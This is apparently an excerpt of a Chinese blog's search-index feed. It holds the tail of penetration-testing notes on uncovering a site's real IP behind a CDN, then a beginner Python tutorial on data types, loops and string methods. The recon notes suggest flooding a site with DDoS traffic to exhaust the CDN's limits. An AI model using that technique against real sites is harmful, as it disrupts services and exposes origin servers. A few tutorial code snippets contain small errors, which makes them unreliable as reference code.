w8fuckcdn</em></p><h4 id="黑暗引擎搜索特定文件"><a href="#黑暗引擎搜索特定文件" class="headerlink" title="黑暗引擎搜索特定文件"></a>黑暗引擎搜索特定文件</h4><p>（dd）</p><p><a href="get-site-ip.com">第三方查询网站</a></p><h4 id="DNS历史记录"><a href="#DNS历史记录" class="headerlink" title="DNS历史记录"></a>DNS历史记录</h4><p>查询网站在没有使用CDN之前暴露的ip地址</p><h4 id="以量打量"><a href="#以量打量" class="headerlink" title="以量打量"></a>以量打量</h4><p>DDoS攻击，CDN其实就是流量，流量是有上限的，当超过上限就没法继续节点转发而是访问到真实ip了。利用DDoS攻击使访问超过流量阈值。</p><p><strong>判断找没找对真实ip</strong></p><p>在hosts里面加上目标网址和自己找到的ip</p><p>先终端里面ping一下看看有没有生效，然后浏览器打开目标网站，如果打开了，说明找到的ip应该就是真实了ip了。但是也有可能是CDN节点哈。。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2023/05/14/python/"/>
      <url>/2023/05/14/python/</url>
      
        <content type="html"><![CDATA[<h3 id="菜鸟教程基础知识"><a href="#菜鸟教程基础知识" class="headerlink" title="菜鸟教程基础知识"></a>菜鸟教程基础知识</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &#x27;&#x27;&#x27;</span><br><span class="line"> print(&quot;psych is handsome!&quot;);</span><br><span class="line"> &#x27;&#x27;&#x27;</span><br><span class="line"> ​</span><br><span class="line"> &#x27;&#x27;&#x27;</span><br><span class="line">  &#x27;&#x27;&#x27;或者&quot;&quot;&quot;    多行注释 </span><br><span class="line">     #         单行注释</span><br><span class="line"> &#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h4 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h4><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以<strong>使用反斜杠 \ 来实现多行语句</strong>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> total = item_one + \</span><br><span class="line">         item_two + \</span><br><span class="line">         item_three       </span><br><span class="line"> # [] &#123;&#125; () 中的语句，不需要反斜杠来实现多行语句</span><br></pre></td></tr></table></figure><h4 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h4><p>Python3 中有六个标准的数据类型：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</li><li><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</li></ul><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><p>python中有四种类型</p><blockquote><p>int 表示为长整形，没有python2中的long</p><p>bool True False <strong>注意写法</strong></p><p>float 1.234 4E-2</p><p>complex(复数) 1+2j 1.1+2.2j</p></blockquote><p><strong>数值计算</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 5+4              加法</span><br><span class="line"> 5.5-3.3          减法</span><br><span class="line"> 3*6              乘法</span><br><span class="line"> 3/4              除法，得到浮点数</span><br><span class="line"> 2//4             除法，得到整数（该例为0）</span><br><span class="line"> 17%3             取余</span><br><span class="line"> 2**5             乘方（该例为32）</span><br></pre></td></tr></table></figure><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> str = &#x27;123456789&#x27;</span><br><span class="line"> ​</span><br><span class="line"> print(str)  # 输出字符串                                                  123456789</span><br><span class="line"> print(str[0:-1])  # 输出第一个到倒数第二个的所有字符                        12345678</span><br><span class="line"> print(str[0])  # 输出字符串第一个字符                                      1 </span><br><span class="line"> print(str[2:5])  # 输出从第三个开始到第五个的字符                           345</span><br><span class="line"> print(str[2:])  # 输出从第三个开始后的所有字符                              3456789</span><br><span class="line"> print(str[1:5:2])  # 输出从第二个开始到第五个且每隔一个的字符（步长为2）      24</span><br><span class="line"> print(str * 2)  # 输出字符串两次                                          123456789123456789</span><br><span class="line"> print(str + &#x27;你好&#x27;)  # 连接字符串                                          123456789你好</span><br><span class="line">               ###这个[a:b]是左毕右开，数值从0开始，或者左边从-1开始###</span><br></pre></td></tr></table></figure><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>列表可以完成大多数集合类的数据结构实现。<strong>列表中元素的类型可以不相同</strong>，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 [ ] 之间、用逗号分隔开的元素列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> list = [ &#x27;abcd&#x27;, 786 , 2.23, &#x27;runoob&#x27;, 70.2 ]</span><br><span class="line"> tinylist = [123, &#x27;runoob&#x27;]</span><br><span class="line"> #python里面的列表和C语言的数组很像，</span><br><span class="line"> &#x27;&#x27;&#x27;</span><br><span class="line"> 也是可以更改的，</span><br><span class="line"> 也可以像字符串一样被索引和切片，</span><br><span class="line"> 也可以用 + 拼接</span><br><span class="line"> &#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>元组（tuple）与列表类似，不同之处在于<strong>元组的元素不能修改</strong>。元组写在小括号 () 里，元素之间用逗号隔开。</p><p><strong>元组中的元素类型也可以不相同</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> tuple = ( &#x27;abcd&#x27;, 786 , 2.23, &#x27;runoob&#x27;, 70.2  )</span><br><span class="line"> tinytuple = (123, &#x27;runoob&#x27;)</span><br></pre></td></tr></table></figure><p>比较特殊的是包含0个或者1个元素的元组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> tup1 = ()    # 空元组</span><br><span class="line"> tup2 = (20,) # 一个元素，需要在元素后添加逗号</span><br></pre></td></tr></table></figure><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><p>集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作<strong>元素或是成员</strong>。</p><p>基本功能是进行成员关系测试和删除重复元素。</p><p>可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> sites = &#123;&#x27;Google&#x27;, &#x27;Taobao&#x27;, &#x27;Runoob&#x27;, &#x27;Facebook&#x27;, &#x27;Zhihu&#x27;, &#x27;Baidu&#x27;&#125;</span><br><span class="line"> ​</span><br><span class="line"> # 输出集合，重复的元素被自动去掉</span><br><span class="line"> print(sites)   </span><br><span class="line"> ​</span><br><span class="line"> # 成员测试</span><br><span class="line"> if &#x27;Runoob&#x27; in sites :</span><br><span class="line">     print(&#x27;Runoob 在集合中&#x27;)</span><br><span class="line"> else :</span><br><span class="line">     print(&#x27;Runoob 不在集合中&#x27;)</span><br><span class="line"> ​</span><br><span class="line"> # set可以进行集合运算</span><br><span class="line"> a = set(&#x27;abracadabra&#x27;)</span><br><span class="line"> b = set(&#x27;alacazam&#x27;)</span><br><span class="line"> print(a)</span><br><span class="line"> print(a - b)     # a 和 b 的差集</span><br><span class="line"> print(a  b)     # a 和 b 的并集</span><br><span class="line"> print(a &amp; b)     # a 和 b 的交集</span><br><span class="line"> print(a ^ b)     # a 和 b 中不同时存在的元素</span><br></pre></td></tr></table></figure><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典是一种映射类型，字典用 { } 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。</p><p>键(key)必须使用不可变类型。一般就是字符串</p><p>在同一个字典中，键(key)必须是唯一的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> dict = &#123;&#125;</span><br><span class="line"> dict[&#x27;one&#x27;] = &quot;1 - 菜鸟教程&quot;</span><br><span class="line"> dict[2]     = &quot;2 - 菜鸟工具&quot;</span><br><span class="line"> tinydict = &#123;&#x27;name&#x27;: &#x27;runoob&#x27;,&#x27;code&#x27;:1, &#x27;site&#x27;: &#x27;www.runoob.com&#x27;&#125;</span><br><span class="line"> ​</span><br><span class="line"> print (dict[&#x27;one&#x27;])       # 输出键为 &#x27;one&#x27; 的值</span><br><span class="line"> print (dict[2])           # 输出键为 2 的值</span><br><span class="line"> print (tinydict)          # 输出完整的字典</span><br><span class="line"> print (tinydict.keys())   # 输出所有键</span><br><span class="line"> print (tinydict.values()) # 输出所有值</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 1 - 菜鸟教程</span><br><span class="line"> 2 - 菜鸟工具</span><br><span class="line"> &#123;&#x27;name&#x27;: &#x27;runoob&#x27;, &#x27;code&#x27;: 1, &#x27;site&#x27;: &#x27;www.runoob.com&#x27;&#125;</span><br><span class="line"> dict_keys([&#x27;name&#x27;, &#x27;code&#x27;, &#x27;site&#x27;])</span><br><span class="line"> dict_values([&#x27;runoob&#x27;, 1, &#x27;www.runoob.com&#x27;])</span><br></pre></td></tr></table></figure><h3 id="Python安全编程与Python运维实战"><a href="#Python安全编程与Python运维实战" class="headerlink" title="Python安全编程与Python运维实战"></a>Python安全编程与Python运维实战</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     if 表达式1:</span><br><span class="line">         语句块1 </span><br><span class="line">         elif 表达式2:</span><br><span class="line">         语句块2           #需要注意的就是空格必须保持一致，同一等级的语句必须对齐</span><br><span class="line">     elif 表达式3:</span><br><span class="line">         语句块3</span><br><span class="line">     else:</span><br><span class="line">         语句块n</span><br></pre></td></tr></table></figure><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">     for 变量 in 序列或者可迭代对象:</span><br><span class="line">         循环体(语句块)</span><br></pre></td></tr></table></figure><p>可迭代对象：比如列表，元组，字典，字符串</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230102020219047-1024x251.png" style="zoom:50%;" /><p>e.g1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     sum = 0</span><br><span class="line">     for i in range(1, 101):</span><br><span class="line">         sum = sum + i</span><br><span class="line">     print(sum)     </span><br></pre></td></tr></table></figure><p>e,g2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     a = &#x27;abc123&#x27;</span><br><span class="line">     for i in a:</span><br><span class="line">         print(i)</span><br><span class="line">     # 输出a,b,c,1,2,3</span><br></pre></td></tr></table></figure><p>打印九九乘法表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     for i in range(1,10):</span><br><span class="line">         for j in range(1,i+1):</span><br><span class="line">             print(str(i)+&#x27;*&#x27;+str(j)+&#x27;=&#x27;+str((i*j)), end=&#x27;\t&#x27;)</span><br><span class="line">         print()</span><br></pre></td></tr></table></figure><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><p>相较于for循环，while循环更多的是用于循环次数不确定的情况下。常见的是<code>while True</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">     while 循环条件:</span><br><span class="line">         循环体(语句块)</span><br></pre></td></tr></table></figure><p>e.g:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     sum = i = 0</span><br><span class="line">     while i &lt;= 100:</span><br><span class="line">         sum = sum + i</span><br><span class="line">         i = i + 1</span><br><span class="line">     print(sum)</span><br></pre></td></tr></table></figure><p>break(跳出循环体用)</p><p>[和 if 一起用呗]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     while True:</span><br><span class="line">         a = input()</span><br><span class="line">         if a == &#x27;6&#x27;:</span><br><span class="line">             break</span><br><span class="line">         print(a) </span><br></pre></td></tr></table></figure><p>写一个登录脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     username = &#x27;1836969156&#x27;</span><br><span class="line">     password = &#x27;youzhi&#x27;</span><br><span class="line">     i = 1</span><br><span class="line">     while True:</span><br><span class="line">         username1 = input(&#x27;请输入用户名:&#x27;)</span><br><span class="line">         password1 = input(&quot;请输入密码:&quot;)</span><br><span class="line">         if username1 == username and password1 == password:</span><br><span class="line">             print(&#x27;登陆成功&#x27;)</span><br><span class="line">             break</span><br><span class="line">         elif i &gt;= 3:</span><br><span class="line">             print(&#x27;连续三次输错，账号锁定&#x27;)</span><br><span class="line">             break</span><br><span class="line">         else:</span><br><span class="line">             print(&#x27;登录失败，请重新输入用户名，密码&#x27;)</span><br><span class="line">             i += 1;</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    def Add(x,y):</span><br><span class="line">        return x + y</span><br><span class="line"> ​</span><br><span class="line">    Add(5,8)  #13</span><br></pre></td></tr></table></figure><p>然而，有些函数(方法)，只能对特定的对象使用，如split()函数专门用于字符串这种对象的分割[默认以空格为分隔符，分割出来变成列表]</p><h4 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h4><p>定义类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> class Hero(object):</span><br><span class="line">     health = 100</span><br><span class="line">     power = 70</span><br><span class="line">     def add(self,x,y):</span><br><span class="line">         return x + y</span><br><span class="line">     &#x27;&#x27;&#x27;</span><br><span class="line">     1.定义了名为Hero()的类，类中包括health，power两个变量和一个add函数(类中的函数通常称为方法)</span><br><span class="line">     2.定义类的时候类的名字后面要跟上object，表名这个类继承自object类(父类)</span><br><span class="line">     3.类中定义函数的时候，函数第一个参数必须是self参数</span><br><span class="line">     &#x27;&#x27;&#x27;</span><br><span class="line">     zhaoyun = Hero()   #实例化一个对象</span><br><span class="line">     zhaoyun.Add(4,5)   #调用这个类里面的方法</span><br></pre></td></tr></table></figure><p>常用的有关类的查询函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">        dir(Hero)    #可以查看一个类里面有哪些方法</span><br><span class="line">        help(Hero.add)   #查看类里面的方法的具体用法，定义</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230102034630608-1024x124.png"></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230102034649995.png" style="zoom:50%;" /><p>总结</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230102035015339-1024x332.png" style="zoom:67%;" /><h4 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h4><h5 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h5><p>字符串中的每一个字符都可以被看做一个独立的元素，都有一个相应的索引编号，索引编号从0开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     a = &#x27;python&#x27;</span><br><span class="line">     i = 0</span><br><span class="line">     for i in range(0,6):</span><br><span class="line">         print(a[i]) </span><br><span class="line">              #输出p,y,t,h,o,n</span><br></pre></td></tr></table></figure><h5 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h5><p>指定一个索引区间，取出指定的字符串，就称为切片。</p><p><code>[起始索引:结束索引:步长]</code> 步长默认是1，遵守左闭右开</p><p>e.g:水仙花数改进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> for a in range(100,1000):</span><br><span class="line">     bai = str(a)[0]</span><br><span class="line">     shi = str(a)[1]</span><br><span class="line">     ge = str(a)[2]</span><br><span class="line">     if int(bai)**3 + int(shi)**3 + int(ge)**3 == a:</span><br><span class="line">         print(a)</span><br><span class="line"> #或者</span><br><span class="line"> for a in range(100,1000):</span><br><span class="line">     bai,shi,ge = str(a) #字符串就可以自动切片然后分配给三个变量  </span><br><span class="line">      #还可以    = map(int,str(a))直接先变成int</span><br><span class="line">     if int(bai)**3 + int(shi)**3 + int(ge)**3 == a:</span><br><span class="line">         print(a)</span><br></pre></td></tr></table></figure><h5 id="常用函数和方法"><a href="#常用函数和方法" class="headerlink" title="常用函数和方法"></a>常用函数和方法</h5><p>函数是<strong>通用</strong>的，适用于所有对象，而方法是<strong>专用</strong>的，适用于特定的对象。</p><ul><li><code>len(a)</code> 求a的长度。a可以是字符串，元组，列表，字典，集合</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> print(len(&#x27;python&#x27;))                                          6       </span><br><span class="line"> print(len([1, 2, 3]))                                         3</span><br><span class="line"> print(len((&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;)))                                   3</span><br><span class="line"> print(len(&#123;&#x27;ftp&#x27;: 21, &#x27;ssh&#x27;: 22, &#x27;http&#x27;: 80&#125;))                3</span><br><span class="line"> print(len(&#123;21, 22, 80&#125;))                                      3</span><br></pre></td></tr></table></figure><ul><li><code>max(),min()</code>求最值。字符串就是比ASCII大小[一个一个比]</li></ul><p>参数：key，指定比较大小的依据</p><p> print(max([‘abc’, ‘abcd’], key&#x3D;len))   #abcd</p><ul><li><code>sorted()</code>用于排序，如果字符串排序，就按照ASCII大小生成列表</li><li><code>reversed()</code>对可迭代对象进行反转，并返回reversed对象</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> print(list(reversed([&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;])))     # [&#x27;4&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;1&#x27;]</span><br><span class="line"> print(list(reversed(&#x27;python&#x27;)))             # [&#x27;n&#x27;, &#x27;o&#x27;, &#x27;h&#x27;, &#x27;t&#x27;, &#x27;y&#x27;, &#x27;p&#x27;]</span><br><span class="line"> #补充</span><br><span class="line"> print(&#x27;python&#x27;[::-1])                           # nohtyp   可以：print(list(&#x27;python&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><strong>注</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> print(list(reversed([&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;])))     # [&#x27;4&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;1&#x27;]</span><br><span class="line"> print(list(reversed(&#x27;python&#x27;)))             # [&#x27;n&#x27;, &#x27;o&#x27;, &#x27;h&#x27;, &#x27;t&#x27;, &#x27;y&#x27;, &#x27;p&#x27;]</span><br><span class="line"> #补充</span><br><span class="line"> print(&#x27;python&#x27;[::-1])                     </span><br><span class="line"># nohtyp  可以：</span><br><span class="line"> print(list(&#x27;python&#x27;[::-1]))</span><br><span class="line">用reversed处理得到的是一个对象，要先用list()函数处理变成一个列表，再打印输出</span><br></pre></td></tr></table></figure><ul><li><p><code>split()</code>将字符串根据某个分隔符进行<strong>分割</strong>，分割之后会得到一个列表。默认是以空白符号(<strong>空格，换行符，制表符</strong>等)作为分隔符如果要用其他的作为分隔符，格式如下 split(‘.’)   #用’.’作为分隔符</p></li><li><p><code>join()</code>与split()相反，用于将字符串连接起来，通常与列表配合使用。 a &#x3D; [‘192’, ‘168’, ‘2’]<br> b &#x3D; ‘.’.join(a)<br> print(b)             #192.168.2格式就是：<code>&#39;分隔符&#39;.join(要组合的对象)</code>不指定分隔符就是直接join应用：实现字符串的反转：<code>&#39;&#39;.join(reverser(&#39;python&#39;))</code>‘python’[::-1]</p></li><li><p><code>strip(),rstrpi(),lstrip()</code></p><ul><li>strip()用于去除字符串头尾指定的字符，如果不指定，就默认去除空白字符(空格，回车，换行)</li><li>rstrip()用于去除字符串右端指定字符</li><li>lstrip()用于去除字符串左端指定字符</li></ul><p> a &#x3D; ‘     psych   ‘<br> print(‘\‘’+a.strip()+’\‘’)             #’psych’<br> print(‘\‘’+a.rstrip()+’\‘’)            #’     psych’<br> print(‘\‘’+a.lstrip()+’\‘’)            #’psych   ‘<br> print(‘psych.py’.strip(‘.py’))         #’sych’   ‘. p y’都去掉了??</p></li><li><p><code>replace()</code>将字符串中部分指定字符进行替换。</p><ul><li>字符串属于不可变序列，字符串中的内容不允许改变</li><li>通过replacee()方法会生成新的字符串，原先字符串中的内容保持不变</li></ul><p> a &#x3D; ‘<a href="http://www.baidu.com/">www.baidu.com</a>‘<br> b &#x3D; a.replace(‘com’, ‘cn’)<br> print(b)         # <a href="http://www.vbaidu.cn/">www.vbaidu.cn</a></p></li><li><p><code>maketrans()和translate()</code></p><ul><li>maketrans()用来生成字符映射表</li><li>translate()按照字符映射表中定义的对应关系，将字符串中的指定字符进行替换使用这两种方法可以同时替换多个不同的字符，replase()则只能一次性替换一个</li></ul><p>e.g:培根密码：(把AB互换) a &#x3D; ‘BBBBABBBBBBBBABBAABABAABBBABBBABBBABAABBBAABAABBABBBABABAABABAABABBBAA’<br> b &#x3D; a.replace(‘A’, ‘C’).replace(‘B’, ‘A’).replace(‘C’, ‘B’)<br> print(b)<br> ​<br> trantab &#x3D; ‘’.maketrans(‘AB’, ‘BA’)<br> c &#x3D; a.translate(trantab)<br> print(c)</p></li><li><p><code>find(),rfind()</code></p><ul><li>find()用于查找一个字符串在另一个字符串中首次出现的位置</li><li>rfind()用于查找一个字符串在另一个字符串中最后一次出现的位置 a &#x3D; ‘<a href="http://www.baidu.vip.com/">www.baidu.vip.com</a>‘<br> print(a.find(‘.’))                        #3(int类型)<br> print(a.rfind(‘.’))                       #13<br> print(a.find(‘baidu’))                    #4<strong>注</strong>：如果不存在，就会返回-1</li></ul></li><li><p><code>index()和rindex()</code>大体功能和find(),rfind()一样，不同的是，如果指定的字符串不存在，就会抛出异常而不是输出-1</p></li><li><p><code>startswith()和endswith()</code>这两个方法用来判断字符串是否以指定的字符串开始或结束，endswith()通常用于检测文件的扩展名 a &#x3D; ‘psych is handsome’<br> print(a.startswith(‘psy’))             #True<br> print(a.endswith(‘some’))              #True<br> print(a.endswith(‘somer’))             #False<br> #检查后缀，扩展名<br> a &#x3D; ‘a01.com.py’<br> print(a.endswith(‘.py’))               #True endswith()和startswith()括号里面不仅可以指定单个字符串还可以指定元组<code>(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;)</code> print(‘test.py’.endswith((‘.py’, ‘.txt’, ‘.md’)))    #True</p></li><li><p><code>upper(),lower(),swapcase()</code></p><ul><li>upper()将字符串转换成大写形式</li><li>lower()将字符串转换成小写形式</li><li>swapcase()实现大小写互换</li></ul><p><strong>注</strong>：这三种方法都是生成新的字符串，并不对原来的字符串做变动 a &#x3D; ‘i love python’  <br> print(a.upper())                  #I LOVE PYTHON<br> print(a.lower())                  #i love python<br> b &#x3D; ‘I Love Python’<br> print(b.swapcase())               #i lOVE pYTHONe.g:输入验证，忽略大小写,去掉空格 a &#x3D; input(‘please input yes or no:’)<br> b &#x3D; a.upper()               #全部转换成大写<br> c &#x3D; b.strip(‘ ‘,’’)         #前后空格替换成空，中间空格就不替换了有些时候有实际意义，所以不用replace<br> if c &#x3D;&#x3D; ‘YES’:<br>     print(‘continue’)<br> elif c &#x3D;&#x3D; ‘NO’:.<br>     print(‘exit’)</p></li><li><p><code>isupper(),islower()</code></p><ul><li>isupper()判断字符串是否大写</li><li>islower()判断字符串是否小写</li></ul><p>还有类似的很多方法</p><ul><li>**isalpha()**判断字符串是否是字母</li><li>**isdigit()**判断字符串是否是数字</li><li>**isalnum()**判断字符串是否是由字母或者数字组成</li></ul></li><li><p><code>count()</code>用来返回一个字符串在另一个字符串中出现的次数，如果不存在就返回0</p></li><li><p><code>center(),ljust(),rjust()</code></p><ul><li>center()返回指定宽度的新字符串，原字符串居中，两侧用指定的字符填充。默认情况空格填充</li><li>ljust(),rjust()，分别将原字符串放在最左侧和最右侧 a &#x3D; ‘psych, I Love You’<br> print(a.center(30, ‘*‘))          # ******psych, I Love You*******<br> print(a.rjust(30, ‘%’))           # %%%%%%%%%%%%%psych, I Love You<br> print(a.ljust(30, ‘%’))           # psych, I Love You%%%%%%%%%%%%%</li></ul></li></ul><h5 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h5><ul><li><p>%占位符字符串格式化：要在引用变量的位置使用一个占位符来代替，最后在字符串的后面再按顺序来指定这些变量的名称 name &#x3D; ‘psych’<br> score &#x3D; 99.96<br> s &#x3D; ‘Hi,%s .Your score is %.1f’ % (name, score)<br> print(s)  